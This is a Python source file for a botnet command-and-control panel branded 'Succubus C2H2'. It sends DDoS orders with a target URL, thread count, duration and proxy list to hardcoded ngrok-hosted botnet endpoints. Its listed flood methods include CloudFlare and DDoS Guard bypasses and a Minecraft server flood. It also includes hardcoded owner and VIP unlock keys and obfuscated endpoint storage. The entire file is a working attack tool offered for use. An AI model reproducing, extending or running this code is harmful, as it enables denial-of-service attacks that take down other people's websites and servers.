import requests, random, os
from datetime import datetime
from os.path import exists
from colorama import Fore, init
init(autoreset=True)
import sys
sys.set_int_max_str_digits(200000000)
from urllib.parse import urlparse
from requests.exceptions import *
import json

file_kkey = ".kkeys.json"
methodss = ['HTTP2', 'CFB', 'REQ', 'BYP', 'ROCKET', 'MIX', 'CFPRO', 'KILL', 'SOC', 'MELTED', 'FUCK', 'CHARGE', 'SUCCUBUS', 'DOZEN', 'DEADMC']
desc = ['HTTP /2.2 requests.', 'CloudFlare bypass.', 'Normal requests.', 'DDoS Guard, CloudFlare, Amazon bypass.', 'Using webdriver module.', 'All-in-one method.', 'advanced CloudFlare bypass.', 'Big encrypted data post.', 'Socket requests.', 'Melted method.', 'Page encryption requests.', 'No Desc.', 'Energy absorb.', 'A fast and lightning DDoS process with raw requests', 'Flood Minecraft server with handshake and packet']
def clean_url(url):
    parsed = urlparse(url)

    cleaned = (parsed.netloc + parsed.path).rstrip('/')
    return cleaned

# Mapping huruf dan spasi ke biner
char_to_binary = {
    'A': '65', 'B': '66', 'C': '67', 'D': '68', 'E': '69', 'F': '70',
    'G': '71', 'H': '72', 'I': '73', 'J': '74', 'K': '75', 'L': '76',
    'M': '77', 'N': '78', 'O': '79', 'P': '80', 'Q': '81', 'R': '82',
    'S': '83', 'T': '84', 'U': '85', 'V': '86', 'W': '87', 'X': '88',
    'Y': '89', 'Z': '90', '1': '49', '2': '50', '3': '51', '4': '52',
    '5': '53', '6': '54', '7': '55', '8': '56', '9': '57', '0': '48',
    '-': '45', '_': '95', '=': '61', '+': '43', '[': '91', '{': '123',
    '}': '125', ']': '93', '\\': '92', '|': '124', ';': '59', ':': '58',
    "'": '39', '"': '34', ',': '44', '<': '60', '.': '46', '>': '62',
    '/': '47', '?': '63', '~': '126', '': '96', '!': '33', '@': '64',
    '#': '35', '$': '36', '%': '37', '^': '94', '&': '38', '*': '42',
    '(': '40', ')': '41', ' ': '00', 'a': '97', 'b': '98', 'c': '99',
    'd': '100', 'e': '101', 'f': '102', 'g': '103', 'h': '104', 'i': '105',
    'j': '106', 'k': '107', 'l': '108', 'm': '109', 'n': '110', 'o': '111',
    'p': '112', 'q': '113', 'r': '114', 's': '115', 't': '116', 'u': '117',
    'v': '118', 'w': '119', 'x': '120', 'y': '121', 'z': '122', '\n': '202'
}

# Membalik mapping untuk dekripsi
binary_to_char = {v: k for k, v in char_to_binary.items()}

def encrypt_no_space(text):
    encrypted = []
    total_chars = len(text)
    for i, char in enumerate(text):
        if char in char_to_binary:
            encrypted.append(char_to_binary[char])
        else:
            raise ValueError(f"Karakter tidak dikenali: {char}")
    return ''.join(encrypted)

def decrypt_no_space(binary_text):
    decrypted = []
    i = 0
    total_length = len(binary_text)
    while i < len(binary_text):
        # Coba ambil 3 digit (untuk ASCII 100 ke atas)
        if binary_text[i:i+3] in binary_to_char:
            decrypted.append(binary_to_char[binary_text[i:i+3]])
            i += 3
        # Jika tidak cocok, ambil 2 digit (untuk ASCII di bawah 100)
        elif binary_text[i:i+2] in binary_to_char:
            decrypted.append(binary_to_char[binary_text[i:i+2]])
            i += 2
        else:
            raise ValueError(f"Segmen tidak dikenali: {binary_text[i:i+3]}")
    return ''.join(decrypted)

def encrypt(text):
    encrypted = encrypt_no_space(text)
    return ''.join(str(encrypted))

def decrypt(byte_data):
    dec = decrypt_no_space(str(byte_data))
    return ''.join(dec)

purple=Fore.LIGHTMAGENTA_EX;white=Fore.RESET;black=Fore.BLACK;old_purple=Fore.MAGENTA
user = None
hide = False
a = False

if not exists(file_kkey):
    command_json = "https://37ea-111-92-165-20.ngrok-free.app/botnet/command.json"
    command_php = "https://37ea-111-92-165-20.ngrok-free.app/botnet/command.php"
    accepted_php = "https://37ea-111-92-165-20.ngrok-free.app/botnet/accepted.php"
else:
    command_json = str(json.loads(open(file_kkey, 'r').read())['csj']) if str(json.loads(open(file_kkey, 'r').read())['csj']).startswith('https://') or str(json.loads(open(file_kkey, 'r').read())['csj']).startswith('http://') else decrypt(str(json.loads(open(file_kkey, 'r').read())['csj']))
    command_php = str(json.loads(open(file_kkey, 'r').read())['cph']) if str(json.loads(open(file_kkey, 'r').read())['cph']).startswith('https://') or str(json.loads(open(file_kkey, 'r').read())['cph']).startswith('http://') else decrypt(str(json.loads(open(file_kkey, 'r').read())['cph']))
    accepted_php = str(json.loads(open(file_kkey, 'r').read())['aph']) if str(json.loads(open(file_kkey, 'r').read())['aph']).startswith('https://') or str(json.loads(open(file_kkey, 'r').read())['aph']).startswith('http://') else decrypt(str(json.loads(open(file_kkey, 'r').read())['aph']))
def setup_file_kkey(csj, cph, aph):
    structure = json.dumps({
        "csj": csj,
        "cph": cph,
        "aph": aph
    })
    open(file_kkey, 'a').write(structure);print("[+] Saved.")
ongoing = None
ongoing_data = []
method = None
method_data = []
custom = None
custom_data = []

help_menu = """
 #  │     [CMD]     │            [DESCRIPTION]            │
────┼───────────────┼─────────────────────────────────────┼
1.  │ help          │ Show this message                   │
2.  │ reset-req     │ Cancel DDoS order by request-id     │
3.  │ ongoing       │ Check current ongoing DDoS          │
4.  │ running       │ Check DDoS requests queue in server │
5.  │ method        │ Show available method in this panel │
6.  │ enable-vip    │ Become the VIP user                 │
7.  │ enable-owner  │ Become the owner                    │
8.  │ clear         │ Refresh page                        │
9.  │ set-kkey      │ Apply new K-Key                     │
10. │ rev-kkey      │ Reveal current K-Key                │
"""

def tabel_ongoing(data):
    global ongoing_data, ongoing
    headers = ["[REQUEST-ID]", "[HOST]", "[SINCE]", "[TYPE]", "[METHOD]"]
    ongoing_data.append(data)
    rows = [headers] + ongoing_data
    col_widths = [max(len(str(row[i])) for row in rows) + 2 for i in range(len(headers))]

    def format_row(index, row):
        if index is not None:
            row_num = f"{index}.".ljust(3)
        else:
            row_num = " # ".ljust(3)
        row_str = "│".join(f" {str(row[i]).ljust(col_widths[i] - 1)}" for i in range(len(row)))
        return f"{row_num}│{row_str}│"

    def separator():
        return "───┼" + "┼".join("─" * col_widths[i] for i in range(len(col_widths))) + "┼"

    output = format_row(None, headers) + '\n'
    output += separator() + '\n'
    for i, row in enumerate(ongoing_data, start=1):
        output += format_row(i, row) + '\n'

    ongoing = output
    rebuild_table(headers)

def table_delete(index):
    global ongoing_data, ongoing
    if 1 <= index <= len(ongoing_data):
        del ongoing_data[index - 1]
    else:
        print(f"Index {index} tidak valid.")

    headers = ["[NAME]", "[HOST]", "[SINCE]", "[TYPE]", "[DESCRIPTION]"]
    rebuild_table(headers)

def rebuild_table(headers):
    global ongoing, ongoing_data
    rows = [headers] + ongoing_data
    col_widths = [max(len(str(row[i])) for row in rows) + 2 for i in range(len(headers))]

    def format_row(index, row):
        if index is not None:
            row_num = f"{index}.".ljust(3)
        else:
            row_num = " # ".ljust(3)
        row_str = "│".join(f" {str(row[i]).ljust(col_widths[i] - 1)}" for i in range(len(row)))
        return f"{row_num}│{row_str}│"

    def separator():
        return "───┼" + "┼".join("─" * col_widths[i] for i in range(len(col_widths))) + "┼"

    output = format_row(None, headers) + '\n'
    output += separator() + '\n'
    for i, row in enumerate(ongoing_data, start=1):
        output += format_row(i, row) + '\n'

    ongoing = output

def tabel_method(data):
    global method_data, method
    headers = ["[NAME]", "[TYPE]", "[DESCRIPTION]"]
    method_data.append(data)
    rows = [headers] + method_data
    col_widths = [max(len(str(row[i])) for row in rows) + 2 for i in range(len(headers))]

    def format_row(index, row):
        if index is not None:
            row_num = f"{index}.".ljust(3)
        else:
            row_num = " # ".ljust(3)
        row_str = "│".join(f" {str(row[i]).ljust(col_widths[i] - 1)}" for i in range(len(row)))
        return f"{row_num}│{row_str}│"

    def separator():
        return "───┼" + "┼".join("─" * col_widths[i] for i in range(len(col_widths))) + "┼"

    output = format_row(None, headers) + '\n'
    output += separator() + '\n'
    for i, row in enumerate(method_data, start=1):
        output += format_row(i, row) + '\n'

    method = output
    rebuild_table_method(headers)

def table_delete_method(index):
    global method_data, method
    if 1 <= index <= len(method_data):
        del method_data[index - 1]
    else:
        print(f"Index {index} tidak valid.")

    headers = ["[NAME]", "[TYPE]", "[DESCRIPTION]"]
    rebuild_table_method(headers)

def rebuild_table_method(headers):
    global method, method_data
    rows = [headers] + method_data
    col_widths = [max(len(str(row[i])) for row in rows) + 2 for i in range(len(headers))]

    def format_row(index, row):
        if index is not None:
            row_num = f"{index}.".ljust(3)
        else:
            row_num = " # ".ljust(3)
        row_str = "│".join(f" {str(row[i]).ljust(col_widths[i] - 1)}" for i in range(len(row)))
        return f"{row_num}│{row_str}│"

    def separator():
        return "───┼" + "┼".join("─" * col_widths[i] for i in range(len(col_widths))) + "┼"

    output = format_row(None, headers) + '\n'
    output += separator() + '\n'
    for i, row in enumerate(method_data, start=1):
        output += format_row(i, row) + '\n'

    method = output

def tabel_custom(headers, data):
    global custom_data, custom
    headers = headers
    custom_data.append(data)
    rows = [headers] + custom_data
    col_widths = [max(len(str(row[i])) for row in rows) + 2 for i in range(len(headers))]

    def format_row(index, row):
        if index is not None:
            row_num = f"{index}.".ljust(3)
        else:
            row_num = " # ".ljust(3)
        row_str = "│".join(f" {str(row[i]).ljust(col_widths[i] - 1)}" for i in range(len(row)))
        return f"{row_num}│{row_str}│"

    def separator():
        return "───┼" + "┼".join("─" * col_widths[i] for i in range(len(col_widths))) + "┼"

    output = format_row(None, headers) + '\n'
    output += separator() + '\n'
    for i, row in enumerate(custom_data, start=1):
        output += format_row(i, row) + '\n'

    custom = output
    rebuild_table_custom(headers)

def table_delete_custom(headers, condition):
    global custom_data, custom

    if isinstance(condition, int):
        if 1 <= condition <= len(custom_data):
            del custom_data[condition - 1]
        else:
            print(f"{purple}[{white}+{purple}]{white} Row {condition} is not valid.")

    elif isinstance(condition, dict):
        key = next(iter(condition))
        value = condition[key]

        if key not in headers:
            print(f"{purple}[{white}+{purple}]{white} Column {key} is not valid.")
            return

        index_to_delete = None
        key_idx = headers.index(key)

        for i, row in enumerate(custom_data):
            if str(row[key_idx]) == str(value):
                index_to_delete = i
                break

        if index_to_delete is not None:
            del custom_data[index_to_delete]
        else:
            print(f"{purple}[{white}+{purple}]{white} Invalid {key} = {value}")

    else:
        pass

    rebuild_table_custom(headers)

def rebuild_table_custom(headers):
    global custom, custom_data
    rows = [headers] + custom_data
    col_widths = [max(len(str(row[i])) for row in rows) + 2 for i in range(len(headers))]

    def format_row(index, row):
        if index is not None:
            row_num = f"{index}.".ljust(3)
        else:
            row_num = " # ".ljust(3)
        row_str = "│".join(f" {str(row[i]).ljust(col_widths[i] - 1)}" for i in range(len(row)))
        return f"{row_num}│{row_str}│"

    def separator():
        return "───┼" + "┼".join("─" * col_widths[i] for i in range(len(col_widths))) + "┼"

    output = format_row(None, headers) + '\n'
    output += separator() + '\n'
    for i, row in enumerate(custom_data, start=1):
        output += format_row(i, row) + '\n'

    custom = output

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def login():
    global user
    if exists('.resource/user.txt'):
        user = open('.resource/user.txt', 'r').read().strip()
        pass
    else:
        os.mkdir('.resource')
        open('.resource/user.txt', 'a').write(input(""+'\033[0;31;40m'+"•"+purple+" "+'\033[0m'+"Name          "+purple+': '+'\033[0m') or 'Succubus')
        open('.resource/crede.txt', 'a').write('Succubus')
        user = open('.resource/user.txt', 'r').read().strip()
        clear()

def is_vip():
    if exists('.resource/crede.txt'):
        return True if 'VIP=TRUE' in open('.resource/crede.txt', 'r').read().strip() else False
    else:
        open('.resource/crede.txt', 'a').write('Succubus')
        return False

def is_owner():
    if exists('.resource/crede.txt'):
        return True if 'OWNER=TRUE' in open('.resource/crede.txt', 'r').read().strip() else False
    else:
        open('.resource/crede.txt', 'a').write('Succubus')
        return False

def prompt():
    try:
        return input(f"\n{white}┏━━━━({purple}{user}{white}-{purple}SuccubusH2{white})━━{purple}▼{white}\n┗━{purple}▸{white} ")
    except KeyboardInterrupt:
        exit(1)

class Logo:
    def MainLogo():
        logo = f"""
                  {purple}░{white}{purple}░{white}{purple}░{white}{purple}░{white}{purple}░{white}{purple}░{white}{purple}░{white}{purple}░{white}                 █{old_purple}▒{white}       ▓▓                 {purple}░{white}{purple}░{white}{purple}░{white}{purple}░{white}{purple}░{white}{purple}░{white}{purple}░{white}
                {purple}░{white}{old_purple}▒{white}▓▓███▓▓▓{old_purple}▒{white}{old_purple}▒{white}{purple}░{white}            {purple}░{white}██{old_purple}▒{white}       ███             {purple}░{white}{old_purple}▒{white}{old_purple}▒{white}▓▓▓██▓▓{old_purple}▒{white}{purple}░{white}
           {old_purple}▒{white}▓██████████████████▓{purple}░{white}         {old_purple}▒{white}██{purple}░{white}     {old_purple}▒{white}█▓{old_purple}▒{white}         {old_purple}▒{white}▓██████████████████▓{old_purple}▒{white}
         {purple}░{white}▓█▓▓{old_purple}▒{white}{old_purple}▒{white}{old_purple}▒{white}▓▓███████████████▓{purple}░{white}    {purple}░{white}▓▓{old_purple}▒{white}{old_purple}▒{white}{purple}░{white}     {old_purple}▒{white}{old_purple}▒{white}{old_purple}▒{white}▓▓     {purple}░{white}▓███████████████▓▓{old_purple}▒{white}{old_purple}▒{white}{old_purple}▒{white}▓▓█▓
                     {old_purple}▒{white}███████████████  {purple}░{white}█████▓     █████▓  {purple}░{white}██████████████▓{old_purple}▒{white}
                        ▓██████████{old_purple}▒{white}{old_purple}▒{white} {old_purple}▒{white}████▓███{purple}░{white} {old_purple}▒{white}██▓█████ {purple}░{white}{old_purple}▒{white}▓██████████▓{purple}░{white}
            ▓          {purple}░{white}██████████    ███▓   {purple}░{white}▓█▓█▓    ████    ██████████{purple}░{white}         {purple}░{white}▓
            █{purple}░{white}     {purple}░{white}  ▓█{old_purple}▒{white}   {old_purple}▒{white}████{old_purple}▒{white}  █{old_purple}▒{white}██▓  {old_purple}▒{white}█▓▓▓█▓▓██   ███▓▓  █████    ▓█{old_purple}▒{white}        ▓█
            ██{old_purple}▒{white}  {purple}░{white}▓{purple}░{white}  █{purple}░{white}  █▓▓█████  ████▓  ██       ██  ████▓  █████{old_purple}▒{white}▓▓  ▓█  {old_purple}▒{white}▓   ▓█▓
             ▓██ {purple}░{white}█   {purple}░{white}  ██▓{old_purple}▒{white}{old_purple}▒{white}█████ {old_purple}▒{white}████▓ {purple}░{white}█▓     ▓█  █████  █████{old_purple}▒{white}{old_purple}▒{white}▓█{old_purple}▒{white}  {old_purple}▒{white}   █ {old_purple}▒{white}██{old_purple}▒{white}
               ▓█▓█▓     {old_purple}▒{white}     {old_purple}▒{white}████ {old_purple}▒{white}█████{purple}░{white} {old_purple}▒{white}▓{purple}░{white} {old_purple}▒{white}▓{old_purple}▒{white} {old_purple}▒{white}█████{purple}░{white} ████{purple}░{white}     {old_purple}▒{white}     ████{old_purple}▒{white}
                 {old_purple}▒{white}███{old_purple}▒{white} {purple}░{white}▓█▓{purple}░{white}    {old_purple}▒{white}████▓{old_purple}▒{white}▓████{old_purple}▒{white}  {old_purple}▒{white}▓{purple}░{white}  ▓████▓{old_purple}▒{white}█████     {old_purple}▒{white}▓▓{old_purple}▒{white}  ▓██▓{purple}░{white}
                   {purple}░{white}▓███▓█████{purple}░{white}     {purple}░{white}▓█▓▓▓{old_purple}▒{white}███▓{purple}░{white} {old_purple}▒{white}▓██▓{old_purple}▒{white}▓▓▓█{old_purple}▒{white}{purple}░{white}     {old_purple}▒{white}█████▓███{old_purple}▒{white}
                         {old_purple}▒{white}██████{old_purple}▒{white}      ▓▓█▓  ▓██{old_purple}▒{white}██{old_purple}▒{white}  ███{old_purple}▒{white}      ▓██████{old_purple}▒{white}
                        {old_purple}▒{white}█▓   {purple}░{white}▓██▓ {old_purple}▒{white}█  {old_purple}▒{white}▓{old_purple}▒{white}▓{purple}░{white}  ███  {old_purple}▒{white}▓{old_purple}▒{white}▓{purple}░{white}  █ {purple}░{white}███▓{purple}░{white}  {purple}░{white}██{purple}░{white}
                        {purple}░{white}█       {old_purple}▒{white}█████{purple}░{white}    {purple}░{white}  {purple}░{white}█  {purple}░{white}     {purple}░{white}█████{purple}░{white}      {purple}░{white}█{purple}░{white}
                         {old_purple}▒{white}▓{purple}░{white}          {purple}░{white}{old_purple}▒{white}{purple}░{white}{purple}░{white}             {purple}░{white}{old_purple}▒{white}{old_purple}▒{white}{purple}░{white}          {old_purple}▒{white}█{purple}░{white}
                          {purple}░{white}{old_purple}▒{white}{old_purple}▒{white}                                      {purple}░{white}{old_purple}▒{white}{old_purple}▒{white}
                                    Succubus C2H2  by MrSanZz
        Welcome to C2H2 || Copyright (c) 2025 MrSanZz || All right reserved
        """
        return logo

def command_botnet(method, url, thread, time, tpe, proxy):
    proxies = ''.join(open(proxy, 'r').read().replace('\n', ','))
    raw_method = str(method).upper()
    method = 'PX'+str(method).upper()
    rids = "".join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(32))
    data = {
        "command": [
            {
                "execute": method,
                "thread": thread,
                "time": time,
                "tpe": tpe,
                "proxy": proxies,
                "url": url,
                "request-id": rids
            }
        ]
    }
    now = datetime.now().strftime("%m/%d/%y %H:%M")
    try:
        response = requests.post(command_php, json=data).json()
    except Exception as e:
        response = {'status': 'Invalid K-Key'}
    if str(url).startswith('https://') or str(url).startswith('http://'):
        filtered_url = clean_url(url)
    else:
        filtered_url = url
    if response['status'] == 'Command added':
        tabel_ongoing([rids, filtered_url, now, "Layer7" if raw_method in methodss else "Layer4", raw_method])
    else:
        print(f"{purple}[{white}+{purple}]{white} Error: Invalid K-Key")

def method_description():
    method_available = methodss
    description = desc
    count_desc = 0
    for _ in method_available:
        count_desc += 1
        tabel_method([method_available[count_desc-1], 'Layer7', description[count_desc-1]])
    count_desc = 0

def reset_req(request_id):
    try:
        response = requests.get(command_json)
        command_data = response.json()
        for cmd in command_data["command"]:
            resp = requests.post(accepted_php, json={"request-id": request_id}).json()
            if resp['status'] == 'Command with request-id removed':
                print(f"{purple}[{white}+{purple}]{white} Request-ID: {request_id} has been deleted from ongoing")
    except Exception as e:
        print(f"{purple}[{white}+{purple}]{white} Error: Invalid K-Key")

def total_command():
    try:
        response = requests.get(command_json)
        command_data = response.json()
    except Exception as e:
        print(f"{purple}[{white}+{purple}]{white} Error: Invalid K-Key")
        command_data = {"command": []}

    for cmd in command_data["command"]:
        method = cmd['execute']
        thread = cmd['thread']
        time = cmd['time']
        tpe = cmd['tpe']
        url = cmd['url']
        request_id = cmd["request-id"]
        if str(url).startswith('https://') or str(url).startswith('http://'):
            filtered_url = clean_url(url)
        else:
            filtered_url = url
        if custom is not None:
            if request_id in custom:
                continue
            else:
                tabel_custom(['[METHOD]', '[THREAD]', '[TIME]', '[POOL]', '[HOST]', '[REQUEST-ID]'],[str(method).replace('PX', ''), thread, time, tpe, filtered_url, request_id])
        else:
            tabel_custom(['[METHOD]', '[THREAD]', '[TIME]', '[POOL]', '[HOST]', '[REQUEST-ID]'],[str(method).replace('PX', ''), thread, time, tpe, filtered_url, request_id])

def reset():
    clear()
    print(Logo.MainLogo())
    print(f"\033[1;3m{purple}VIP{white}: {is_vip()} || {purple}OWNER{white}: {is_owner()}")

if __name__ == '__main__':
    login()
    clear()
    print(Logo.MainLogo())
    print(f"\033[1;3m{purple}VIP{white}: {is_vip()} || {purple}OWNER{white}: {is_owner()}")
    method_description()
    count = 0
    count2 = 6
    while True:
        try:
            user_input = prompt().split(' ')
            if user_input:
                if user_input[1-1].lower() == 'hide-help':
                    a = True
                    hide = True
                elif user_input[1-1].lower() == 'enb-help':
                    a = False
                    hide = False
                elif user_input[1-1].lower() == 'exit':
                    break
                elif user_input[1-1].lower() == 'ongoing':
                    print(ongoing)
                    hide=True
                elif user_input[1-1].lower() == 'set-kkey':
                    kkey1 = input(f"{purple}[{white}+{purple}]{white} KKey-cjs: "); kkey2 = input(f"{purple}[{white}+{purple}]{white} KKey-cph: "); kkey3 = input(f"{purple}[{white}+{purple}]{white} KKey-aph: ")
                    if (
                        kkey1.startswith(('https://', 'http://')) and
                        kkey2.startswith(('https://', 'http://')) and
                        kkey3.startswith(('https://', 'http://'))
                    ):
                        command_json = kkey1
                        command_php = kkey2
                        accepted_php = kkey3
                        print(f"{purple}[{white}+{purple}]{white} Added."); setup_file_kkey(encrypt(command_json), encrypt(command_php), encrypt(accepted_php))
                    else:
                        command_json = decrypt(kkey1)
                        command_php = decrypt(kkey2)
                        accepted_php = decrypt(kkey3)
                        print(f"{purple}[{white}+{purple}]{white} Added."); setup_file_kkey(encrypt(command_json), encrypt(command_php), encrypt(accepted_php))
                    hide=True
                elif user_input[1-1].lower() == 'rev-kkey':
                    kkey1 = encrypt(command_json)
                    kkey2 = encrypt(command_php)
                    kkey3 = encrypt(accepted_php)
                    print(f"{purple}[{white}+{purple}]{white} KKey-cjs: {kkey1}\n{purple}[{white}+{purple}]{white} KKey-cph: {kkey2}\n{purple}[{white}+{purple}]{white} KKey-aph: {kkey3}")
                    hide=True
                elif user_input[1-1].lower() == 'clear':
                    hide=True
                    reset()
                elif user_input[1-1].lower() == 'help':
                    hide = True
                    print(help_menu)
                elif user_input[1-1].lower() == 'running':
                    total_command()
                    print(custom)
                    hide=True
                elif user_input[1-1].lower() == 'reset-req':
                    hide=True
                    table_delete_custom(['[METHOD]', '[THREAD]', '[TIME]', '[POOL]', '[HOST]', '[REQUEST-ID]'], {"[REQUEST-ID]": str(user_input[2-1])})
                    counts = 2
                    for _ in user_input:
                        counts -= 1
                    if counts == 0:
                        reset_req(str(user_input[2-1]))
                    else:
                        print(f"{purple}[{white}+{purple}]{white} Missing request id: reset-req <request-id>")
                    counts = 2
                elif user_input[1-1].lower() == 'method':
                    hide=True
                    print(method)
                elif user_input[1-1].lower() == 'test_debug':
                    print("No code need to be debugged")
                elif user_input[1-1].lower() == 'enable-vip':
                    hide=True
                    open('.resource/crede.txt', 'a').write('\nVIP=TRUE') if input(f"{purple}[{white}+{purple}]{white} Key: ") == 'VIPSUCCUBUS2025' else print(f'{purple}[{white}!{purple}]{white} Not the key.')
                elif user_input[1-1].lower() == 'enable-owner':
                    hide=True
                    open('.resource/crede.txt', 'a').write('\nOWNER=TRUE') if input(f"{purple}[{white}+{purple}]{white} Key: ") == 'MrSanZz2025JogjaXploit' else print(f'{purple}[{white}!{purple}]{white} Not the key.')
                for _ in user_input:
                    count2 -= 1
                if count2 == 0:
                    count2 = 6
                    for creden in user_input:
                        count += 1
                        if user_input[1-1].upper() in methodss:
                            if count == 3 or count == 4 or count == 5:
                                if creden.isdigit():
                                    #<method> https://example.com <thread> <time> <tpe> <proxy: proxy.txt>
                                    methods=user_input[1-1];url=user_input[2-1];thread=user_input[3-1];time=user_input[4-1];tpe=user_input[5-1];proxy=user_input[6-1]
                                    checked_result = True
                                else:
                                    print(f'{purple}[{white}+{purple}]{white} Usage: <method> https://example.com <thread> <time> <pool> <proxy: proxy.txt>')
                                    checked_result = False
                                    break
                        else:
                            print(f"{purple}[{white}+{purple}]{white} Type 'help' to show more information")
                            break
                    if checked_result:
                        command_botnet(methods, url, thread, time, tpe, proxy)
                    else:
                        pass
                    count = 0
                else:
                    count2 = 6
                    if user_input[1-1].upper() in methodss:
                        print(f'{purple}[{white}+{purple}]{white} Usage: <method> https://example.com <thread> <time> <pool> <proxy: proxy.txt>')
                    else:
                        if not hide:
                            print(f"{purple}[{white}+{purple}]{white} Type 'help' to show more information and type 'hide-help' to hide this message\n\t or 'enb-help' to show this message again")
                        else:
                            pass
                if a:
                    hide = True
                else:
                    hide = False
        except KeyboardInterrupt:
            exit(1)
